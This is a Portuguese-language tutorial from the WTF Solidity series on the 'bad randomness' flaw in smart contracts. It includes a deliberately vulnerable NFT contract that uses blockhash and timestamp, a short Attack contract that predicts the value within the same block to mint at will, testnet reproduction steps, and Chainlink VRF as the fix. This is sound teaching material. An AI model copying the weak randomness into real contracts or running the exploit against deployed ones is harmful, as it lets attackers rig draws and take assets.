# WTF Solidity Contrato Seguro: S07. Má Sorteio

Recentemente, tenho revisitado o estudo do Solidity para consolidar detalhes e escrever um "WTF Solidity guia introdutório" para iniciantes (os especialistas em programação podem procurar outros tutoriais). Será atualizado semanalmente com 1-3 aulas.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Comunidade: [Discord](https://discord.gg/5akcruXrsk) | [Grupo no WeChat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) | [Site Oficial da wtf.academy](https://wtf.academy)

Todo o código e tutoriais estão disponíveis no GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTF-Solidity)

---

Nesta aula, vamos falar sobre a vulnerabilidade de "Má Sorteio" em contratos inteligentes e métodos de prevenção. Essa vulnerabilidade é comum em projetos de NFT e GameFi, como Meebits, Loots, Wolf Game, entre outros.

## Números Pseudorandômicos

Muitas aplicações na Ethereum requerem o uso de números aleatórios, como para sortear `tokenId` de NFTs, abrir lootboxes, determinar resultados aleatórios em batalhas de GameFi, entre outros. No entanto, devido à transparência e determinismo dos dados na Ethereum, não existe um método para gerar números aleatórios como na maioria das outras linguagens de programação, como `random()`. Portanto, muitos projetos acabam utilizando métodos de geração de números pseudorandômicos na blockchain, como `blockhash()` e `keccak256()`.

Vulnerabilidade de Má Sorteio: Hackers podem calcular previamente os resultados desses números pseudorandômicos e manipulá-los conforme desejarem, como criar NFTs raros específicos em vez de sortear aleatoriamente. Para saber mais, consulte [WTF Solidity guia introdutório aula 39: Números Pseudorandômicos](./39_Random).

## Exemplo de Má Sorteio

Abaixo, vamos analisar um contrato de NFT com a vulnerabilidade de Má Sorteio: BadRandomness.sol.

```solidity
contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // Construtor, inicializa o nome e o símbolo da coleção de NFTs
    constructor() ERC721("", ""){}

    // Função de cunhagem: um NFT só é cunhado se o luckyNumber for igual ao número aleatório
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // cunhar
        totalSupply++;
    }
}
```

Este contrato possui a função principal `luckyMint()`, onde o usuário deve inserir um número de `0-99`, que, se coincidir com o número pseudorandômico gerado na blockchain, permite cunhar um NFT da sorte. A vulnerabilidade está no fato de que o usuário pode prever com precisão o número aleatório gerado e cunhar o NFT desejado.

Agora, vamos criar um contrato de ataque `Attack.sol`.

```solidity
contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // Calcular previamente o número aleatório
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // Realizar o ataque usando o luckyNumber
        nftAddr.luckyMint(luckyNumber);
    }
}
```

A função de ataque `attackMint()` recebe o endereço do contrato `BadRandomness` como parâmetro. Nela, calculamos o número aleatório `luckyNumber` e o passamos como argumento para a função `luckyMint()` para realizar o ataque. Como `attackMint()` e `luckyMint()` são chamados no mesmo bloco, o `blockhash()` e o `block.timestamp` são os mesmos, gerando o mesmo número aleatório.

## Reprodução no Remix

Como o Remix com Remix VM não suporta a função `blockhash()`, é necessário implantar os contratos na testnet Ethereum para reproduzir o ataque.

1. Implantar o contrato `BadRandomness`.

2. Implantar o contrato `Attack`.

3. Passar o endereço do contrato `BadRandomness` como parâmetro para a função `attackMint()` do contrato `Attack` e executar o ataque.

4. Usar a função `balanceOf` do contrato `BadRandomness` para verificar o saldo de NFTs do contrato de ataque e confirmar o sucesso do ataque.

## Métodos de Prevenção

Normalmente, utilizamos números aleatórios gerados fora da blockchain por meio de projetos de oráculos, como o Chainlink VRF, para prevenir esse tipo de vulnerabilidade. Esses números aleatórios são gerados fora da blockchain e depois enviados para a mesma, garantindo que sejam imprevisíveis. Para saber mais, consulte [WTF Solidity guia introdutório aula 39: Números Pseudorandômicos](./39_Random).

## Conclusão

Nesta aula, abordamos a vulnerabilidade de Má Sorteio em contratos inteligentes e apresentamos um método simples de prevenção: utilizar números aleatórios gerados fora da blockchain por meio de projetos de oráculos. Projetos de NFT e GameFi devem evitar o uso de números pseudorandômicos na blockchain para sorteios, a fim de evitar possíveis ataques de hackers.

